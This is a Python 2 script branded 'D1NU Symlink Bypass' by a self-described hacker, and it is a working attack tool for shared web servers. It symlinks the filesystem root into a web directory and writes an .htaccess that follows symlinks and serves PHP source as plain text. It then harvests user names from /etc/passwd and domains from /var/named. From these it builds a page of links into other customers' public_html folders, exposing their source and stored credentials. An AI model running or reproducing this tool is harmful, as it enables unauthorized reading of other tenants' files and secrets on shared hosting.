#/*Python

import time
import os
import sys
import re

os.system("color C")

hta = "\nFile : .htaccess // Created Successfully!\n"
f = "All Processes Done!\nSymlink Bypassed Successfully!\n"
print "\n"
print "~"*60
print "D1NU Symlink Bypass (Python Script) "
print "~"*60

os.makedirs('DINU')
os.chdir('DINU')

susr=[]
sitex=[]
os.system("ln -s / DINU.txt")

h = "Options Indexes FollowSymLinks\nDirectoryIndex DINU.phtml\nAddType txt .php\nAddHandler txt .php"
m = open(".htaccess","w+")
m.write(h)
m.close()
print hta

sf = "<html><title>Symlink Bypass by hAxOr D1NU_C3N7R4</title><center><br><font color=white size=5>D1NU Symlink Bypass (Python Script)</font></font><br><font color=white size=3><table>"

o = open('/etc/passwd','r')
o=o.read()
o = re.findall('/home/\w+',o)

for xusr in o:
	xusr=xusr.replace('/home/','')
	susr.append(xusr)
print "-"*30
xsite = os.listdir("/var/named")

for xxsite in xsite:
	xxsite=xxsite.replace(".db","")
	sitex.append(xxsite)
print f
path=os.getcwd()
if "/public_html/" in path:
	path="/public_html/"
else:
	path = "/html/"
counter=1
ips=open("DINU.phtml","w")
ips.write(sf)

for fusr in susr:
	for fsite in sitex:
		fu=fusr[0:5]
		s=fsite[0:5]
		if fu==s:
			ips.write("<tr><td style=font-family:calibri;font-weight:bold;color:black;>%s</td><td style=font-family:calibri;font-weight:bold;color:red;>%s</td><td style=font-family:calibri;font-weight:bold;><a href=DINU.txt/home/%s%s target=_blank >%s</a></td>"%(counter,fusr,fusr,path,fsite))
			counter=counter+1